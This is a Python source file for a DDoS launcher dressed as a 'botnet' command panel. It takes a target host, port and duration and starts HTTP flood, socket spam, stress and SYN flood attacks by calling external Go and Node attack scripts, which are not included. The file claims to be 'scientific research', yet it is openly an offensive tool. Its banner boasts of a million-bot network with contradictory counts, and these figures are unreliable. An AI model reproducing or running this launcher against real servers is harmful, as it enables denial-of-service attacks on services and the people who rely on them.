import socket
import os
import requests
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep
from pystyle import *
from getpass import getpass as hinput
import random
from pystyle import Colors, Colorate, Center
import getpass
import time
from time import sleep
import sys
from colorama import init,Fore,Back
import threading


#Methods
def lol():
    print(f"""\x1b[91m1, \x1b[92mA botnet is a network of computer devices infected with malware and controlled by remote hackers
A botnet can include hundreds of thousands
even millions of computers. Each bot acts as a tool to spread malware
viruses and DDoS attacks.

\x1b[91m2, \x1b[92mBotnet DDoS attacks appear with high frequency and large scale
Accordingly hackers use a large number of bots to send a series of access requests to the target
pushing the system into an overloaded state
consuming all bandwidth, and making network services inoperable.""")

#Methods
def hihi():
    print(f"""\x1b[92mVersion\x1b[91m: \x1b[92mBotnet Test
\x1b[92mCreator\x1b[91m: \x1b[92m@HaiBe_Vx Hacker Team CyberAnpn. CyberAnon_Vx
\x1b[92mCreated date\x1b[91m: \x1b[92mJuly 21, 2004
\x1b[92mPurpose\x1b[91m: \x1b[92mScientific research and operation, testing""")

#Methods
def sex():
    print(f"""\x1b[92mNumber of botnets on the network: \x1b[91m379,092 \x1b[92mThousand
\x1b[92mStill active: \x1b[91m387 \x1b[92mThousand""")

#Methods
def help():
    print(f"""\x1b[92msocket\x1b[91m: \x1b[92mSocket http Spam using Botnet \x1b[91m'\x1b[92msocket <target> <time>\x1b[91m'
\x1b[92mkiller\x1b[91m: \x1b[92mSlowing down the server causes paralysis
\x1b[92mhttp-browser\x1b[91m: \x1b[92mServer attacks bypass human authentication requirements
\x1b[92mstress\x1b[91m: \x1b[92mZooming in causes the server to freeze as soon as possible
\x1b[92mflood\x1b[91m: \x1b[92mFlooder Using Botnet Simultaneous attacks stack \x1b[91m'\x1b[92mflood <target> <number bot> <time>\x1b[91m'
\x1b[92msynflood\x1b[91m: \x1b[92msyn flood  using botnet to attack target crippling server \x1b[91m'\x1b[92msynflood <target> <port> <time>\x1b[91m'""")

#main
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    sys.stdout.write(f"\x1b]2;[Anonymous_BotNet]\x07")
    print(f"""\x1b[92m

⠀ ⢠⣶⣿⣿⣗⡢⠀⠀⠀⠀⠀⠀⢤⣒⣿⣿⣷⣆⠀⠀      \x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mWelcome to the Botnet program
 ⠀⠋⠉⠉⠙⠻⣿⣷⡄⠀⠀⠀⣴⣿⠿⠛⠉⠉⠉⠃⠀      \x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mBotnet with more than a million Botnets from all over the world
 ⠀⠀⢀⡠⢤⣠⣀⡹⡄⠀⠀⠀⡞⣁⣤⣠⠤⡀⠀⠀⠀      \x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mFull Bot network ready to attack when receiving orders\x1b[92m
 ⢐⡤⢾⣿⣿⢿⣿⡿⠀⠀⠀⠀⠸⣿⣿⢿⣿⣾⠦⣌⠀      \x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mTotal number of Botnets: \x1b[91m652 \x1b[92mThousand
 ⠁⠀⠀⠀⠉⠈⠀⠀⣸⠀⠀⢰⡀⠀⠈⠈⠀⠀⠀⠀⠁
 ⠀⠀⠀⠀⠀⠀⣀⡔⢹⠀⠀⢸⠳⡄⡀⠀⠀⠀⠀⠀⠀      \x1b[92mBotnet commands
 ⠸⡦⣤⠤⠒⠋⠘⢠⡸⣀⣀⡸⣠⠘⠉⠓⠠⣤⢤⡞⠀      \x1b[91m1. \x1b[92mSee the program's attack method\x1b[92m
 ⠀⢹⡜⢷⣄⠀⣀⣀⣾⡶⢶⣷⣄⣀⡀⢀⣴⢏⡾⠁⠀      \x1b[91m2. \x1b[92mCheck operating status\x1b[92m
⠀ ⠀⠹⡮⡛⠛⠛⠻⠿⠥⠤⠽⠿⠛⠛⠛⣣⡾⠁⠀⠀      \x1b[91m3. \x1b[92mProgram Creator Information
⠀⠀ ⠀⠙⢄⠁⠀⠀⠀⣄⣀⡄⠀⠀⠀⢁⠞⠀⠀⠀⠀      \x1b[91m4. \x1b[92mWhat are botnets?
⠀⠀⠀ ⠀⠀⠂⠀⠀⠀⢸⣿⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀      \x1b[91m5. \x1b[92mView the tos / rules
⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
    while(True):
        cnc = input('''\x1b[92mEnter Options : ''')
        if cnc == "1" :
            help()
        if cnc == "2" :
            sex()
        if cnc == "3" :
            hihi()
        if cnc == "4" :
            lol()
        elif cnc == "cls":
            main()
        elif cnc == "exit": 
            exit()
        #layer7

        elif "flood" in cnc:
            try:
                host=cnc.split()[1]
                bot=cnc.split()[2]
                time=cnc.split()[3]
                os.system(f"go run flood.go {host} {bot} get {time} ok.txt")
            except IndexError:
                print("")
        elif "socket" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mWhile attacking, please wait for the time to expire to receive orders!""")
                os.system(f"node socket.js {host} {time} 45 1 http.txt")
            except IndexError:
                print("")
        elif "stress" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mWhile attacking, please wait for the time to expire to receive orders!""")
                os.system(f'node stress.js {host} 1 {time}')
            except IndexError:
                print("")
        elif "synflood" in cnc:
            try:
                host=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print(f"""\x1b[91m[\x1b[92m!\x1b[91m] \x1b[92mWhile attacking, please wait for the time to expire to receive orders!""")
                os.system(f"node r2.js {host} {port} 45 {time}")
            except IndexError:
                print("")
        else:
            try:
                cmd=cnc.split()[0]
                print("")
            except IndexError:
                pass
        
main()